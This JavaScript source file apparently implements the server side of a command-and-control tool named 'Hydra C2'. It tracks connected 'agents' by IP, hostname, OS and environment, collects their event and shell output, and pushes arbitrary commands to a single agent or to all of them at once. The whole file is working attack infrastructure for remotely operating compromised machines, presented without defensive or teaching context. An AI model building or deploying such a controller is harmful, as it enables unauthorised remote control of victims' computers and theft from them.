const express = require('express');
const http = require('http');
const { Server } = require("socket.io");
const cors = require('cors');

const app = express();
app.use(cors());

const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

let agents = [];
let eventHistory = [];

io.on('connection', (socket) => {
  console.log('New connection:', socket.id);

  socket.on('identify', (data) => {
    if (data.type === 'agent') {
        // ROBUST RECONNECT: Check by ID (Stable)
        const existingIndex = agents.findIndex(a => a.id === data.id);
        if (existingIndex !== -1) {
            agents[existingIndex].socketId = socket.id;
            agents[existingIndex].status = 'Online';
            agents[existingIndex].lastSeen = Date.now();
            console.log(`[C2] Agent Reconnected: ${data.id}`);
        } else {
            agents.push({
                socketId: socket.id,
                id: data.id || socket.id,
                ip: socket.handshake.address,
                os: data.os || 'Unknown',
                hostname: data.hostname || 'Unknown',
                status: 'Online',
                lastSeen: Date.now(),
                environment: data.environment || {}
            });
            console.log(`[C2] New Agent: ${data.id}`);
        }
        io.emit('agents_list', agents);
    } else if (data.type === 'ui') {
        socket.join('ui_room');
        socket.emit('agents_list', agents);
        socket.emit('history_dump', eventHistory.slice(-50)); 
    }
  });

  socket.on('agent_chunk', (chunk) => {
    // Process Event Chunk
    const event = {
        id: Date.now().toString() + Math.random(),
        type: chunk.type || 'INFO',
        agentId: chunk.agentId || 'unknown',
        timestamp: Date.now(),
        payload: chunk.payload
    };
    
    // Store in History
    eventHistory.push(event);
    if (eventHistory.length > 200) eventHistory.shift(); // Keep last 200 events
    
    // Broadcast to UI
    io.to('ui_room').emit('agent_event', event);
    
    // Log for debug
    if (chunk.type !== 'SHELL_OUTPUT') {
        console.log(`[EVENT] ${chunk.type} from ${chunk.agentId}`);
    }
  });

  socket.on('exec_cmd', (data) => {
      const { targetId, cmd } = data;
      console.log(`[CMD] ${cmd} -> ${targetId}`);
      
      if (targetId === 'all') {
          io.emit('command', { cmd });
      } else {
          const agent = agents.find(a => a.id === targetId);
          if (agent) {
              io.to(agent.socketId).emit('command', { cmd });
          }
      }
  });

  socket.on('disconnect', () => {
      const agentIndex = agents.findIndex(a => a.socketId === socket.id);
      if (agentIndex !== -1) {
          agents[agentIndex].status = 'Offline';
          io.emit('agents_list', agents);
          console.log(`[C2] Agent Offline: ${agents[agentIndex].id}`);
      }
  });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`Hydra C2 Server running on port ${PORT}`);
});

